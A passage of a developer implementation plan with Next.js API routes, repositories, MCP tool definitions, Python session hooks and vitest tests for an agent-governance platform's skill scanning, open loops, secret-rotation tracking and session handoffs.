import { getCachedScan, upsertScan } from '../../../lib/repositories/skill-scan-results.repository.js';

export const dynamic = 'force-dynamic';
export const revalidate = 0;

export async function POST(req) {
  try {
    const sql = getSql();
    const orgId = await getOrgId(req);
    if (!orgId) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });

    const body = await req.json().catch(() => ({}));
    if (!body.skill_name) return NextResponse.json({ error: 'skill_name required' }, { status: 400 });
    if (!body.files || typeof body.files !== 'object' || Object.keys(body.files).length === 0) {
      return NextResponse.json({ error: 'files (non-empty object) required' }, { status: 400 });
    }

    const targetHash = hashContent(body.files);
    const cached = await getCachedScan(sql, orgId, body.skill_name, targetHash);
    if (cached) {
      return NextResponse.json({
        id: cached.id,
        skill_name: cached.skill_name,
        target_hash: cached.target_hash,
        findings: cached.findings,
        passed: cached.passed,
        cached: true,
      });
    }

    const { findings, passed } = scanSkillContent(body.files);
    const result = await upsertScan(sql, orgId, {
      skillName: body.skill_name,
      targetHash,
      findings,
      passed,
    });
    return NextResponse.json({
      id: result.id,
      skill_name: result.skill_name,
      target_hash: result.target_hash,
      findings: result.findings,
      passed: result.passed,
      cached: false,
    });
  } catch (err) {
    console.error('[SKILL SCAN] error:', err);
    return NextResponse.json({ error: 'internal_error' }, { status: 500 });
  }
}
```

- [ ] **Step 4: Implement `app/api/skills/scans/[id]/route.js`**

```javascript
import { NextResponse } from 'next/server';
import { getSql } from '../../../../lib/db.js';
import { getOrgId } from '../../../../lib/org.js';
import { getScanById } from '../../../../lib/repositories/skill-scan-results.repository.js';

export const dynamic = 'force-dynamic';
export const revalidate = 0;

export async function GET(req, { params }) {
  try {
    const { id } = await params;
    const sql = getSql();
    const orgId = await getOrgId(req);
    if (!orgId) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });

    const row = await getScanById(sql, orgId, id);
    if (!row) return NextResponse.json({ error: 'not_found' }, { status: 404 });
    return NextResponse.json(row);
  } catch (err) {
    console.error('[SCAN GET] error:', err);
    return NextResponse.json({ error: 'internal_error' }, { status: 500 });
  }
}
```

- [ ] **Step 5: Run tests, expect PASS**

Run: `npx vitest run __tests__/integration/skills-scan.route.test.js`
Expected: 6 tests pass.

- [ ] **Step 6: Regenerate inventory + openapi**

```bash
npm run api:inventory:generate
npm run openapi:generate
```

- [ ] **Step 7: Commit**

```bash
git add app/api/skills __tests__/integration/skills-scan.route.test.js docs/api-inventory.json docs/api-inventory.md docs/openapi/critical-stable.openapi.json
git commit -m "feat(api): /api/skills/scan with dedupe-by-hash"
```

---

### Task 8: Open-loops routes — audit + add if missing

**Files:**
- Possibly create: `app/api/loops/route.js`, `app/api/loops/[id]/route.js`
- Possibly create: `app/lib/repositories/open-loops.repository.js`
- Test: `__tests__/integration/loops.route.test.js` (only if routes added)

- [ ] **Step 1: Audit what exists**

Run:
```bash
find app/api -name "*loop*" -o -name "*Loop*" | head
grep -r "open_loops" app/lib/repositories/ app/api/ | head
```

- **If `app/api/loops/route.js` exists:** verify it has GET/POST and `/api/loops/[id]/route.js` has PATCH/DELETE. Skip remaining steps and add a `// audit-noop` line to the commit message in Task 9.
- **If nothing exists:** continue with Step 2.

- [ ] **Step 2: Write the open-loops repository (only if step 1 found nothing)**

Create `app/lib/repositories/open-loops.repository.js`:

```javascript
import { randomBytes } from 'node:crypto';

function loopId() {
  return 'loop_' + randomBytes(8).toString('hex');
}

export async function listLoops(sql, orgId, filter = {}) {
  const status = filter.status === 'closed' ? 'closed' : 'open';

  if (filter.agentId) {
    return status === 'closed'
      ? sql`
          SELECT id, org_id, agent_id, description, due_at, created_at, closed_at
          FROM open_loops
          WHERE org_id = ${orgId} AND agent_id = ${filter.agentId} AND closed_at IS NOT NULL
          ORDER BY closed_at DESC
        `
      : sql`
          SELECT id, org_id, agent_id, description, due_at, created_at, closed_at
          FROM open_loops
          WHERE org_id = ${orgId} AND agent_id = ${filter.agentId} AND closed_at IS NULL
          ORDER BY due_at ASC NULLS LAST, created_at ASC
        `;
  }
  return status === 'closed'
    ? sql`
        SELECT id, org_id, agent_id, description, due_at, created_at, closed_at
        FROM open_loops
        WHERE org_id = ${orgId} AND closed_at IS NOT NULL
        ORDER BY closed_at DESC
      `
    : sql`
        SELECT id, org_id, agent_id, description, due_at, created_at, closed_at
        FROM open_loops
        WHERE org_id = ${orgId} AND closed_at IS NULL
        ORDER BY due_at ASC NULLS LAST, created_at ASC
      `;
}

export async function createLoop(sql, orgId, input) {
  if (!input?.agentId) throw new Error('createLoop: agentId required');
  if (!input?.description) throw new Error('createLoop: description required');
  const id = loopId();
  const rows = await sql`
    INSERT INTO open_loops (id, org_id, agent_id, description, due_at)
    VALUES (${id}, ${orgId}, ${input.agentId}, ${input.description}, ${input.dueAt || null})
    RETURNING id, description, due_at
  `;
  return rows[0];
}

export async function closeLoop(sql, orgId, id) {
  const rows = await sql`
    UPDATE open_loops
       SET closed_at = NOW()
     WHERE org_id = ${orgId} AND id = ${id} AND closed_at IS NULL
     RETURNING id, closed_at
  `;
  return rows[0] || null;
}
```

- [ ] **Step 3: Write the routes**

Create `app/api/loops/route.js`:

```javascript
import { NextResponse } from 'next/server';
import { getSql } from '../../lib/db.js';
import { getOrgId } from '../../lib/org.js';
import { listLoops, createLoop } from '../../lib/repositories/open-loops.repository.js';

export const dynamic = 'force-dynamic';
export const revalidate = 0;

export async function GET(req) {
  try {
    const sql = getSql();
    const orgId = await getOrgId(req);
    if (!orgId) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });

    const { searchParams } = new URL(req.url);
    const rows = await listLoops(sql, orgId, {
      agentId: searchParams.get('agent_id') || undefined,
      status: searchParams.get('status') || 'open',
    });
    return NextResponse.json({ loops: rows });
  } catch (err) {
    console.error('[LOOPS GET] error:', err);
    return NextResponse.json({ error: 'internal_error' }, { status: 500 });
  }
}

export async function POST(req) {
  try {
    const sql = getSql();
    const orgId = await getOrgId(req);
    if (!orgId) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });

    const body = await req.json().catch(() => ({}));
    if (!body.agent_id || !body.description) {
      return NextResponse.json({ error: 'agent_id + description required' }, { status: 400 });
    }
    const result = await createLoop(sql, orgId, {
      agentId: body.agent_id,
      description: body.description,
      dueAt: body.due_at || null,
    });
    return NextResponse.json(result, { status: 201 });
  } catch (err) {
    console.error('[LOOPS POST] error:', err);
    return NextResponse.json({ error: 'internal_error' }, { status: 500 });
  }
}
```

Create `app/api/loops/[id]/route.js`:

```javascript
import { NextResponse } from 'next/server';
import { getSql } from '../../../lib/db.js';
import { getOrgId } from '../../../lib/org.js';
import { closeLoop } from '../../../lib/repositories/open-loops.repository.js';

export const dynamic = 'force-dynamic';
export const revalidate = 0;

export async function PATCH(req, { params }) {
  try {
    const { id } = await params;
    const sql = getSql();
    const orgId = await getOrgId(req);
    if (!orgId) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });

    const body = await req.json().catch(() => ({}));
    if (body.status === 'closed') {
      const row = await closeLoop(sql, orgId, id);
      if (!row) return NextResponse.json({ error: 'not_found' }, { status: 404 });
      return NextResponse.json(row);
    }
    return NextResponse.json({ error: 'unsupported_patch' }, { status: 400 });
  } catch (err) {
    console.error('[LOOP PATCH] error:', err);
    return NextResponse.json({ error: 'internal_error' }, { status: 500 });
  }
}
```

- [ ] **Step 4: Write the integration test**

Create `__tests__/integration/loops.route.test.js`:

```javascript
import { describe, it, expect, vi, beforeEach } from 'vitest';

const repo = vi.hoisted(() => ({
  listLoops: vi.fn(),
  createLoop: vi.fn(),
  closeLoop: vi.fn(),
}));
vi.mock('../../app/lib/repositories/open-loops.repository.js', () => repo);
vi.mock('../../app/lib/db.js', () => ({ getSql: () => ({}) }));
vi.mock('../../app/lib/org.js', () => ({ getOrgId: async () => 'org_1' }));

beforeEach(() => Object.values(repo).forEach((fn) => fn.mockReset()));

describe('/api/loops', () => {
  it('GET returns list', async () => {
    repo.listLoops.mockResolvedValue([{ id: 'loop_1', description: 'x' }]);
    const { GET } = await import('../../app/api/loops/route.js');
    const res = await GET(new Request('http://test/api/loops?agent_id=hermes', { headers: { 'x-api-key': 'k' } }));
    expect(res.status).toBe(200);
    const json = await res.json();
    expect(json.loops).toHaveLength(1);
  });

  it('POST creates with valid body', async () => {
    repo.createLoop.mockResolvedValue({ id: 'loop_1', description: 'follow up' });
    const { POST } = await import('../../app/api/loops/route.js');
    const res = await POST(new Request('http://test/api/loops', {
      method: 'POST', headers: { 'x-api-key': 'k', 'content-type': 'application/json' },
      body: JSON.stringify({ agent_id: 'hermes', description: 'follow up' }),
    }));
    expect(res.status).toBe(201);
  });

  it('POST 400 when fields missing', async () => {
    const { POST } = await import('../../app/api/loops/route.js');
    const res = await POST(new Request('http://test/api/loops', {
      method: 'POST', headers: { 'x-api-key': 'k', 'content-type': 'application/json' },
      body: JSON.stringify({}),
    }));
    expect(res.status).toBe(400);
  });

  it('PATCH /api/loops/[id] closes with status=closed', async () => {
    repo.closeLoop.mockResolvedValue({ id: 'loop_1', closed_at: '2026-05-14T00:00:00Z' });
    const { PATCH } = await import('../../app/api/loops/[id]/route.js');
    const res = await PATCH(new Request('http://test/api/loops/loop_1', {
      method: 'PATCH', headers: { 'x-api-key': 'k', 'content-type': 'application/json' },
      body: JSON.stringify({ status: 'closed' }),
    }), { params: Promise.resolve({ id: 'loop_1' }) });
    expect(res.status).toBe(200);
  });
});
```

- [ ] **Step 5: Run tests, expect PASS**

Run: `npx vitest run __tests__/integration/loops.route.test.js`
Expected: 4 tests pass.

- [ ] **Step 6: Regenerate inventory + openapi**

```bash
npm run api:inventory:generate
npm run openapi:generate
```

- [ ] **Step 7: Commit (skip if Step 1 found existing routes)**

```bash
git add app/api/loops app/lib/repositories/open-loops.repository.js __tests__/integration/loops.route.test.js docs/api-inventory.json docs/api-inventory.md docs/openapi/critical-stable.openapi.json
git commit -m "feat(api): /api/loops CRUD over existing open_loops table"
```

---

### Task 9: Register 13 new MCP tools

**Files:**
- Modify: `mcp-server/lib/tools.js`
- Test: `__tests__/unit/mcp-tools-toolkit.test.js`

- [ ] **Step 1: Write failing tests**

Create `__tests__/unit/mcp-tools-toolkit.test.js`:

```javascript
import { describe, it, expect } from 'vitest';
import { TOOL_DEFINITIONS, createToolHandlers } from '../../mcp-server/lib/tools.js';

const NEW_TOOLS = [
  'dashclaw_handoff_create',
  'dashclaw_handoff_latest',
  'dashclaw_handoff_consume',
  'dashclaw_secret_list',
  'dashclaw_secret_due',
  'dashclaw_secret_mark_rotated',
  'dashclaw_skill_scan',
  'dashclaw_loop_add',
  'dashclaw_loop_list',
  'dashclaw_loop_close',
  'dashclaw_learning_log',
  'dashclaw_learning_query',
  'dashclaw_decisions_recent',
];

describe('MCP toolkit tools', () => {
  it('all 13 new toolkit tools are defined', () => {
    const names = TOOL_DEFINITIONS.map((t) => t.name);
    for (const tool of NEW_TOOLS) {
      expect(names).toContain(tool);
    }
  });

  it('every new tool has description, inputSchema with type=object', () => {
    for (const name of NEW_TOOLS) {
      const tool = TOOL_DEFINITIONS.find((t) => t.name === name);
      expect(tool.description).toBeTruthy();
      expect(tool.inputSchema.type).toBe('object');
    }
  });

  it('every new tool has a handler', () => {
    const client = {
      fetch: async () => ({ ok: true, json: async () => ({}) }),
    };
    const handlers = createToolHandlers(client);
    for (const name of NEW_TOOLS) {
      expect(typeof handlers[name]).toBe('function');
    }
  });

  it('handoff_create handler POSTs /api/handoffs', async () => {
    let captured = null;
    const client = {
      fetch: async (path, opts) => {
        captured = { path, body: opts?.body };
        return { ok: true, json: async () => ({ id: 'hf_1' }) };
      },
    };
    const handlers = createToolHandlers(client);
    await handlers.dashclaw_handoff_create({ agent_id: 'hermes', bundle: { summary: 's' } });
    expect(captured.path).toMatch(/\/api\/handoffs$/);
  });

  it('handoff_latest handler GETs /api/handoffs/latest', async () => {
    let captured = null;
    const client = {
      fetch: async (path) => {
        captured = path;
        return { ok: true, json: async () => ({ id: 'hf_1' }) };
      },
    };
    const handlers = createToolHandlers(client);
    await handlers.dashclaw_handoff_latest({ agent_id: 'hermes' });
    expect(captured).toMatch(/\/api\/handoffs\/latest/);
  });

  it('skill_scan handler POSTs /api/skills/scan with skill_name + files', async () => {
    let captured = null;
    const client = {
      fetch: async (path, opts) => {
        captured = { path, body: JSON.parse(opts.body) };
        return { ok: true, json: async () => ({ id: 'scn_1', passed: true }) };
      },
    };
    const handlers = createToolHandlers(client);
    await handlers.dashclaw_skill_scan({ skill_name: 'test', files: { 'a.py': 'print(1)' } });
    expect(captured.path).toMatch(/\/api\/skills\/scan/);
    expect(captured.body.skill_name).toBe('test');
  });

  it('decisions_recent handler builds query params', async () => {
    let captured = null;
    const client = {
      fetch: async (path) => {
        captured = path;
        return { ok: true, json: async () => ({ decisions: [] }) };
      },
    };
    const handlers = createToolHandlers(client);
    await handlers.dashclaw_decisions_recent({ agent_id: 'hermes', action_type: 'deploy', limit: 10 });
    expect(captured).toMatch(/agent_id=hermes/);
    expect(captured).toMatch(/action_type=deploy/);
    expect(captured).toMatch(/limit=10/);
  });
});
```

- [ ] **Step 2: Run test, expect FAIL**

Run: `npx vitest run __tests__/unit/mcp-tools-toolkit.test.js`
Expected: FAIL — tools don't exist yet.

- [ ] **Step 3: Add 13 new tool definitions to `mcp-server/lib/tools.js`**

Inside the `TOOL_DEFINITIONS` array, append after the last existing entry (find via `grep -n "name:" mcp-server/lib/tools.js | tail -3`):

```javascript
  {
    name: 'dashclaw_handoff_create',
    description: 'Create a session handoff bundle for the next session of this agent to consume on start. Call this when wrapping up — include a 1-2 sentence summary, any open loops, decisions made, and freeform state you want the next session to see.',
    inputSchema: {
      type: 'object',
      properties: {
        agent_id: { type: 'string', description: 'Agent ID (override default)' },
        project_id: { type: 'string', description: 'Optional project ID — handoff is project-scoped' },
        bundle: {
          type: 'object',
          description: 'Handoff content: { summary, open_loops, decisions_made, state_snapshot, generated_at }',
        },
      },
      required: ['bundle'],
    },
  },
  {
    name: 'dashclaw_handoff_latest',
    description: 'Fetch the latest unconsumed session handoff for this agent (+ project, optional). Call this on session start to pick up where the last session left off. Returns null if no handoff is waiting.',
    inputSchema: {
      type: 'object',
      properties: {
        agent_id: { type: 'string' },
        project_id: { type: 'string' },
      },
    },
  },
  {
    name: 'dashclaw_handoff_consume',
    description: 'Mark a handoff as consumed. Call after dashclaw_handoff_latest returns a bundle and you have processed it. Idempotent.',
    inputSchema: {
      type: 'object',
      properties: {
        id: { type: 'string', description: 'Handoff id (hf_*) from handoff_latest' },
        session_id: { type: 'string', description: 'Optional current session id for provenance' },
      },
      required: ['id'],
    },
  },
  {
    name: 'dashclaw_secret_list',
    description: 'List tracked secrets (metadata only — no values). Returns each entry with name, rotation interval, last_rotated_at, and computed next_rotation_due.',
    inputSchema: {
      type: 'object',
      properties: {
        agent_id: { type: 'string', description: 'Optional — scope to this agent' },
      },
    },
  },
  {
    name: 'dashclaw_secret_due',
    description: 'List secrets coming due for rotation. Call this BEFORE acting on credentials. If a credential you would use is in the result, flag the operator rather than proceeding.',
    inputSchema: {
      type: 'object',
      properties: {
        within_days: { type: 'integer', description: 'Lookahead window in days (default 14)' },
        agent_id: { type: 'string' },
      },
    },
  },
  {
    name: 'dashclaw_secret_mark_rotated',
    description: 'Mark a tracked secret as rotated (sets last_rotated_at = now). Agents only call this if the operator instructs; secret registration is an operator task.',
    inputSchema: {
      type: 'object',
      properties: {
        id: { type: 'string', description: 'Secret id (sec_*)' },
      },
      required: ['id'],
    },
  },
  {
    name: 'dashclaw_skill_scan',
    description: 'Run a static safety scan against the contents of an untrusted skill before loading it. Returns findings (severity, file, line) and a passed boolean. If passed=false, do NOT load the skill — show the findings to the operator.',
    inputSchema: {
      type: 'object',
      properties: {
        skill_name: { type: 'string' },
        files: {
          type: 'object',
          description: 'Map of filename -> file content (string)',
        },
      },
      required: ['skill_name', 'files'],
    },
  },
  {
    name: 'dashclaw_loop_add',
    description: 'Register an open loop — a commitment made in conversation that needs follow-up. Use when you say "I will X later" so the loop is tracked outside of context.',
    inputSchema: {
      type: 'object',
      properties: {
        agent_id: { type: 'string' },
        description: { type: 'string' },
        due_at: { type: 'string', description: 'Optional ISO timestamp' },
      },
      required: ['description'],
    },
  },
  {
    name: 'dashclaw_loop_list',
    description: 'List open (or closed) loops for an agent. Use on session start to remember what you promised to follow up on.',
    inputSchema: {
      type: 'object',
      properties: {
        agent_id: { type: 'string' },
        status: { type: 'string', enum: ['open', 'closed'] },
      },
    },
  },
  {
    name: 'dashclaw_loop_close',
    description: 'Close an open loop. Call when the followed-up-on item is complete.',
    inputSchema: {
      type: 'object',
      properties: {
        id: { type: 'string', description: 'Loop id (loop_*)' },
      },
      required: ['id'],
    },
  },
  {
    name: 'dashclaw_learning_log',
    description: 'Log a decision + outcome to the learning database. Use after making a non-obvious decision so future sessions can recall the reasoning and outcome.',
    inputSchema: {
      type: 'object',
      properties: {
        agent_id: { type: 'string' },
        decision: { type: 'string', description: 'What was decided' },
        context: { type: 'string', description: 'Why this decision was made' },
        outcome: { type: 'string', description: 'What happened (optional, can be updated later)' },
      },
      required: ['decision'],
    },
  },
  {
    name: 'dashclaw_learning_query',
    description: 'Query the learning database for prior decisions and lessons. Use BEFORE making a decision similar to one you might have made before.',
    inputSchema: {
      type: 'object',
      properties: {
        agent_id: { type: 'string' },
        query: { type: 'string', description: 'Search text (matches decision/context)' },
        limit: { type: 'integer', description: 'Max results (default 10)' },
      },
    },
  },
  {
    name: 'dashclaw_decisions_recent',
    description: 'Query the decisions ledger for recent governed actions. Filter by agent, action type, decision verdict, or time window. Use for in-session retrospection — "what have I done recently?"',
    inputSchema: {
      type: 'object',
      properties: {
        agent_id: { type: 'string' },
        action_type: { type: 'string' },
        decision: { type: 'string', enum: ['allow', 'warn', 'block', 'require_approval'] },
        since: { type: 'string', description: 'ISO timestamp lower bound' },
        limit: { type: 'integer', description: 'Max results (default 20)' },
      },
    },
  },
```

- [ ] **Step 4: Add 13 new handlers inside `createToolHandlers(client)`**

Inside the function in `mcp-server/lib/tools.js`, add to the returned handler map (alongside existing `dashclaw_guard`, `dashclaw_record`, etc.):

```javascript
    async dashclaw_handoff_create(args) {
      const res = await client.fetch('/api/handoffs', {
        method: 'POST',
        body: JSON.stringify({
          agent_id: args.agent_id,
          project_id: args.project_id,
          bundle: args.bundle,
        }),
      });
      return res.json();
    },

    async dashclaw_handoff_latest(args) {
      const params = new URLSearchParams();
      if (args.agent_id) params.set('agent_id', args.agent_id);
      if (args.project_id) params.set('project_id', args.project_id);
      const res = await client.fetch(`/api/handoffs/latest?${params}`);
      if (res.status === 404) return null;
      return res.json();
    },

    async dashclaw_handoff_consume(args) {
      const res = await client.fetch(`/api/handoffs/${encodeURIComponent(args.id)}/consume`, {
        method: 'POST',
        body: JSON.stringify({ session_id: args.session_id }),
      });
      return res.json();
    },

    async dashclaw_secret_list(args) {
      const params = new URLSearchParams();
      if (args.agent_id) params.set('agent_id', args.agent_id);
      const res = await client.fetch(`/api/secrets?${params}`);
      return res.json();
    },

    async dashclaw_secret_due(args) {
      const params = new URLSearchParams();
      if (args.within_days != null) params.set('within_days', String(args.within_days));
      if (args.agent_id) params.set('agent_id', args.agent_id);
      const res = await client.fetch(`/api/secrets/rotation-due?${params}`);
      return res.json();
    },

    async dashclaw_secret_mark_rotated(args) {
      const res = await client.fetch(`/api/secrets/${encodeURIComponent(args.id)}`, {
        method: 'PATCH',
        body: JSON.stringify({ last_rotated_at: new Date().toISOString() }),
      });
      return res.json();
    },

    async dashclaw_skill_scan(args) {
      const res = await client.fetch('/api/skills/scan', {
        method: 'POST',
        body: JSON.stringify({
          skill_name: args.skill_name,
          files: args.files,
        }),
      });
      return res.json();
    },

    async dashclaw_loop_add(args) {
      const res = await client.fetch('/api/loops', {
        method: 'POST',
        body: JSON.stringify({
          agent_id: args.agent_id,
          description: args.description,
          due_at: args.due_at,
        }),
      });
      return res.json();
    },

    async dashclaw_loop_list(args) {
      const params = new URLSearchParams();
      if (args.agent_id) params.set('agent_id', args.agent_id);
      if (args.status) params.set('status', args.status);
      const res = await client.fetch(`/api/loops?${params}`);
      return res.json();
    },

    async dashclaw_loop_close(args) {
      const res = await client.fetch(`/api/loops/${encodeURIComponent(args.id)}`, {
        method: 'PATCH',
        body: JSON.stringify({ status: 'closed' }),
      });
      return res.json();
    },

    async dashclaw_learning_log(args) {
      const res = await client.fetch('/api/learning/log', {
        method: 'POST',
        body: JSON.stringify({
          agent_id: args.agent_id,
          decision: args.decision,
          context: args.context,
          outcome: args.outcome,
        }),
      });
      return res.json();
    },

    async dashclaw_learning_query(args) {
      const params = new URLSearchParams();
      if (args.agent_id) params.set('agent_id', args.agent_id);
      if (args.query) params.set('q', args.query);
      if (args.limit) params.set('limit', String(args.limit));
      const res = await client.fetch(`/api/learning/lessons?${params}`);
      return res.json();
    },

    async dashclaw_decisions_recent(args) {
      const params = new URLSearchParams();
      if (args.agent_id) params.set('agent_id', args.agent_id);
      if (args.action_type) params.set('action_type', args.action_type);
      if (args.decision) params.set('decision', args.decision);
      if (args.since) params.set('since', args.since);
      if (args.limit) params.set('limit', String(args.limit));
      const res = await client.fetch(`/api/decisions?${params}`);
      return res.json();
    },
```

- [ ] **Step 5: Run tests, expect PASS**

Run: `npx vitest run __tests__/unit/mcp-tools-toolkit.test.js`
Expected: 7 tests pass.

- [ ] **Step 6: Run full MCP test suite to catch regressions**

Run: `npx vitest run mcp-server`
Expected: all pre-existing MCP tests still pass + new tests.

- [ ] **Step 7: Commit**

```bash
git add mcp-server/lib/tools.js __tests__/unit/mcp-tools-toolkit.test.js
git commit -m "feat(mcp): 13 new toolkit MCP tools (handoff, secret, skill_scan, loop, learning, decisions_recent)"
```

---

### Task 10: Wire Hermes handoff hooks + E2E test

**Files:**
- Modify: `.hermes/hooks/dashclaw_on_session_end_hermes.py`
- Modify: `.hermes/hooks/dashclaw_on_session_start_hermes.py`
- Modify: `.hermes/hooks/dashclaw_pre_llm_hermes.py`
- Modify: `.hermes/hooks/dashclaw_common.py`
- Test: `__tests__/integration/handoff-e2e.test.js`

- [ ] **Step 1: Read `.hermes/hooks/dashclaw_common.py`**

Run: `cat .hermes/hooks/dashclaw_common.py | head -120`

Note the existing helper names (likely `_post_json`, `_get_json`, `_log` or similar). Adapt the snippets below to match.

- [ ] **Step 2: Add HTTP helpers to `.hermes/hooks/dashclaw_common.py`**

Append:

```python
def post_handoff_create(env, *, agent_id, project_id, bundle):
    """POST /api/handoffs — used by on_session_end. Returns the new handoff id or None on failure."""
    try:
        resp = _post_json(env, "/api/handoffs", {
            "agent_id": agent_id,
            "project_id": project_id,
            "bundle": bundle,
        })
        return (resp or {}).get("id")
    except Exception as exc:
        _log(f"handoff_create failed: {exc}")
        return None


def get_handoff_latest(env, *, agent_id, project_id):
    """GET /api/handoffs/latest — returns the bundle or None."""
    try:
        params = {"agent_id": agent_id}
        if project_id:
            params["project_id"] = project_id
        resp = _get_json(env, "/api/handoffs/latest", params=params)
        return resp
    except Exception as exc:
        _log(f"handoff_latest failed: {exc}")
        return None


def post_handoff_consume(env, *, handoff_id, session_id):
    """POST /api/handoffs/<id>/consume — idempotent."""
    try:
        _post_json(env, f"/api/handoffs/{handoff_id}/consume", {"session_id": session_id})
        return True
    except Exception:
        return False
```

If the existing helper names differ from `_post_json` / `_get_json` / `_log`, substitute them.

- [ ] **Step 3: Update `dashclaw_on_session_end_hermes.py` to create a handoff**

Read the existing file first: `cat .hermes/hooks/dashclaw_on_session_end_hermes.py`.

After the existing finalize call (the `ingest-live` with `finalize: true`), and before the script exits with 0, add:

```python
    bundle = {
        "summary": _summarize_session(payload),
        "open_loops": _collect_open_loops(env, agent_id),
        "decisions_made": _collect_recent_decisions(env, agent_id, session_id),
        "state_snapshot": payload.get("state") or {},
        "generated_at": _utc_iso(),
    }
    handoff_id = post_handoff_create(
        env,
        agent_id=agent_id,
        project_id=payload.get("project_id"),
        bundle=bundle,
    )
    if handoff_id:
        _log(f"handoff created: {handoff_id}")
```

Define the three helpers in the same file (above `main`):

```python
def _summarize_session(payload):
    """Best-effort 1-2 sentence wrap-up. Falls back to a generic line if no info."""
    turns = payload.get("turn_count") or "?"
    tools = payload.get("tools_used") or []
    last = payload.get("last_tool_use", {}).get("name", "—")
    return f"Wrapped session with {turns} turns; last tool: {last}. Touched: {', '.join(tools[:5]) or '—'}."


def _collect_open_loops(env, agent_id):
    try:
        resp = _get_json(env, "/api/loops", params={"agent_id": agent_id, "status": "open"})
        return (resp or {}).get("loops", [])[:10]
    except Exception:
        return []


def _collect_recent_decisions(env, agent_id, session_id):
    try:
        resp = _get_json(env, "/api/decisions", params={"agent_id": agent_id, "limit": 10})
        return (resp or {}).get("decisions", [])
    except Exception:
        return []


def _utc_iso():
    from datetime import datetime, timezone
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")
```

- [ ] **Step 4: Update `dashclaw_on_session_start_hermes.py` to load and consume the latest handoff**

Read the existing file. In the section that pre-warms the policy cache, add (or replace the section):

```python
    handoff = get_handoff_latest(env, agent_id=agent_id, project_id=payload.get("project_id"))
    if handoff and handoff.get("bundle"):
        _cache_set("dashclaw_handoff", handoff)
        post_handoff_consume(env, handoff_id=handoff["id"], session_id=session_id)
        _log(f"handoff consumed: {handoff['id']}")
```

Substitute the actual cache-helper name if not `_cache_set`.

- [ ] **Step 5: Update `dashclaw_pre_llm_hermes.py` to inject the cached handoff**

Read the existing file. Inside the context-injection block, prepend:

```python
    handoff = _cache_get("dashclaw_handoff")
    if handoff and _is_first_turn(session_id):
        bundle = handoff["bundle"]
        summary = bundle.get("summary", "")
        loops = bundle.get("open_loops", [])
        decisions = bundle.get("decisions_made", [])
        lines = ["Previous session handoff:", f"  Summary: {summary}"]
        if loops:
            lines.append("  Open loops you committed to:")
            for loop in loops[:10]:
                lines.append(f"    - {loop.get('description')}")
        if decisions:
            lines.append("  Recent decisions:")
            for d in decisions[:10]:
                lines.append(f"    - {d.get('description') or d.get('declared_goal')}")
        injection_text += "\n" + "\n".join(lines) + "\n"
```

Substitute `injection_text`, `_cache_get`, `_is_first_turn` if names differ. If `_is_first_turn` doesn't exist, define it inline:

```python
_first_turn_seen = set()
def _is_first_turn(session_id):
    if session_id in _first_turn_seen:
        return False
    _first_turn_seen.add(session_id)
    return True
```

- [ ] **Step 6: Write E2E integration test**

Create `__tests__/integration/handoff-e2e.test.js`:

```javascript
import { describe, it, expect, vi, beforeEach } from 'vitest';

const repo = vi.hoisted(() => ({
  createHandoff: vi.fn(),
  getLatestHandoff: vi.fn(),
  consumeHandoff: vi.fn(),
  getHandoffById: vi.fn(),
}));
vi.mock('../../app/lib/repositories/code-session-handoffs.repository.js', () => repo);
vi.mock('../../app/lib/db.js', () => ({ getSql: () => ({}) }));
vi.mock('../../app/lib/org.js', () => ({ getOrgId: async () => 'org_e2e' }));

beforeEach(() => Object.values(repo).forEach((fn) => fn.mockReset()));

describe('handoff end-to-end loop', () => {
  it('create -> latest (200) -> consume -> latest (404)', async () => {
    // 1. Create
    repo.createHandoff.mockResolvedValue({ id: 'hf_e2e' });
    const { POST: createRoute } = await import('../../app/api/handoffs/route.js');
    const createRes = await createRoute(new Request('http://test/api/handoffs', {
      method: 'POST',
      headers: { 'content-type': 'application/json', 'x-api-key': 'test' },
      body: JSON.stringify({
        agent_id: 'test-hermes',
        bundle: { summary: 'session N done', open_loops: [] },
      }),
    }));
    expect(createRes.status).toBe(201);
    const { id } = await createRes.json();
    expect(id).toBe('hf_e2e');

    // 2. Latest — returns the new handoff
    repo.getLatestHandoff.mockResolvedValueOnce({
      id: 'hf_e2e',
      bundle_json: { summary: 'session N done', open_loops: [] },
      agent_id: 'test-hermes',
    });
    const { GET: latestRoute } = await import('../../app/api/handoffs/latest/route.js');
    const latestRes = await latestRoute(new Request('http://test/api/handoffs/latest?agent_id=test-hermes', {
      headers: { 'x-api-key': 'test' },
    }));
    expect(latestRes.status).toBe(200);
    const latestBody = await latestRes.json();
    expect(latestBody.id).toBe('hf_e2e');
    expect(latestBody.bundle.summary).toBe('session N done');

    // 3. Consume
    repo.consumeHandoff.mockResolvedValue({ id: 'hf_e2e', consumed_at: '2026-05-14T00:00:00Z' });
    const { POST: consumeRoute } = await import('../../app/api/handoffs/[id]/consume/route.js');
    const consumeRes = await consumeRoute(new Request('http://test/api/handoffs/hf_e2e/consume', {
      method: 'POST',
      headers: { 'x-api-key': 'test', 'content-type': 'application/json' },
      body: JSON.stringify({ session_id: 'cs_e2e' }),
    }), { params: Promise.resolve({ id: 'hf_e2e' }) });
    expect(consumeRes.status).toBe(200);

    // 4. Latest after consume — 404
    repo.getLatestHandoff.mockResolvedValueOnce(null);
    const latestAfter = await latestRoute(new Request('http://test/api/handoffs/latest?agent_id=test-hermes', {
      headers: { 'x-api-key': 'test' },
    }));
    expect(latestAfter.status).toBe(404);
  });
});
```

- [ ] **Step 7: Run E2E test, expect PASS**

Run: `npx vitest run __tests__/integration/handoff-e2e.test.js`
Expected: 1 test passes.

- [ ] **Step 8: Sanity-check the Python hooks don't crash**

Run from project root:
```bash
echo '{}' | python .hermes/hooks/dashclaw_on_session_end_hermes.py
echo $?
```
Expected: exits 0 (no traceback). Missing API key warnings are fine.

- [ ] **Step 9: Commit**

```bash
git add .hermes/hooks/ __tests__/integration/handoff-e2e.test.js
git commit -m "feat(hermes): wire on_session_end / on_session_start / pre_llm_call to handoff API"
```

---

### Task 11: dashclaw-governance skill — add 6 new sections

**Files:**
- Modify: `public/downloads/dashclaw-governance/SKILL.md`
- Test: `__tests__/unit/dashclaw-governance-skill.test.js`

- [ ] **Step 1: Write failing test**

Create `__tests__/unit/dashclaw-governance-skill.test.js`:

```javascript
import { describe, it, expect } from 'vitest';
